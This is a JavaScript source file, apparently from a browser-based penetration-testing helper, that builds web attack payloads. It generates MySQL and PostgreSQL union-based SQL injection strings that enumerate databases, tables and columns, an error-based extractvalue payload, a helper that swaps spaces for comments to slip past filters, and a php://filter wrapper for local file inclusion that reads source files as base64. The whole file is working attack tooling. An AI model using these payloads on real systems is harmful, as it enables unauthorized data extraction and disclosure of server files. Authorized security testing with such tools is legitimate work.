var Payload = {}

Payload.SQLi = {
  spaceToComment: function (value) {
    return value.replace(/[^\S\r\n]+/g, '/**/')
  },

  'MySQL': class {
    static unionSelect ({ columns, position }) {
      columns = parseInt(columns)
      if (isNaN(columns) === true) {
        return ''
      }

      return 'union select ' +
        Array.from(Array(columns + 1).keys()).slice(1).join(',')
    }

    static dumpDatabases ({ columns, position }) {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      let fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(schema_name)'

      return 'union select ' + fields.join(',') +
        ' from information_schema.schemata'
    }

    static dumpTables ({ columns, position }) {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      let fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(table_name)'

      return 'union select ' + fields.join(',') +
        ' from information_schema.tables where table_schema=database()'
    }

    static dumpColumns ({ columns, position }) {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      let fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(column_name)'

      return 'union select ' + fields.join(',') +
        ' from information_schema.columns where table_schema=database()'
    }

    static errorBased ({ columns, position }) {
      return 'extractvalue(0x0a,concat(0x0a,(select database())))'
    }
  },

  'PostgreSQL': class {
    static unionSelect ({ columns, position }) {
      columns = parseInt(columns)
      if (isNaN(columns) === true) {
        return ''
      }

      return 'union select ' + Array(columns).fill('null').join(',')
    }

    static dumpDatabases ({ columns, position }) {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      let fields = Array(columns).fill('null')
      fields[position - 1] = "string_agg(datname, ',')"

      return 'union select ' + fields.join(',') + ' from pg_database'
    }

    static dumpTables ({ columns, position }) {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      let fields = Array(columns).fill('null')
      fields[position - 1] = "string_agg(tablename, ',')"

      return ' union select ' + fields.join(',') +
        " from pg_tables where schemaname='public'"
    }

    static dumpColumns ({ columns, position }) {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      let fields = Array(columns).fill('null')
      fields[position - 1] = "string_agg(column_name, ',')"

      return 'union select ' + fields.join(',') +
        " from information_schema.columns where table_schema='public'"
    }
  }
}

Payload.LFI = class {
  static phpWrapperBas64 (value) {
    return 'php://filter/convert.base64-encode/resource=' + value
  }
}
